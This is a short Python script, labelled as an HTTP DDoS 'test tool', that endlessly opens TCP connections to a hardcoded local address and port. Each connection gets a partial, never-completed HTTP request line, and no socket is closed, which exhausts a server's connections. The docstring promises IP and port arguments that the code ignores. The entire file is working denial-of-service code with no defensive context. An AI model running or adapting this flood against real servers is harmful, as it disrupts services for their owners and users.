"""
Test tool: HTTP DDOS
Arg 1: IP
Arg 2: Port
"""

from contextlib import suppress
import socket
import time

SEND_COUNT = 0


def send_request(ip, port, wait_time=0):
    """发送一次HTTP/1.1请求."""
    global SEND_COUNT
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, port))
    except ConnectionRefusedError:
        print("Connection Failed.")
        return
    sock.setblocking(False)
    with suppress(ConnectionAbortedError):
        sock.send(b"GET / HTTP/1.1\r\n")
    print(f"Sended Request {SEND_COUNT} / inf")
    SEND_COUNT += 1
    time.sleep(wait_time)


while True:
    LAST_TIME = time.perf_counter()
    send_request("127.0.0.1", 3872)
    LAST_PACKET_TIME = time.perf_counter()
    print(f"Packet Time: {round(LAST_PACKET_TIME - LAST_TIME, 3)}")
